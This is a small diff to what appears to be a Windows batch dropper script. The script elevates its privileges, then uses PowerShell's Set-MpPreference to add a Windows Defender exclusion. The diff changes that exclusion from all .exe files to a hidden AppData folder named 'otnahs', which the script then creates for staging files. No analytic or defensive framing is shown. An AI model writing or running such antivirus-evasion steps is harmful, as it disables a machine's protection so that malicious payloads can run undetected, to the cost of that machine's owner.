@@ -27,7 +27,7 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------
 
-Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+Powershell -Command "Set-MpPreference -ExclusionPath %APPDATA%\Roaming\otnahs"
 
 set "tempFolder=%APPDATA%\Roaming\otnahs"
 md "%tempFolder%" 2>nul
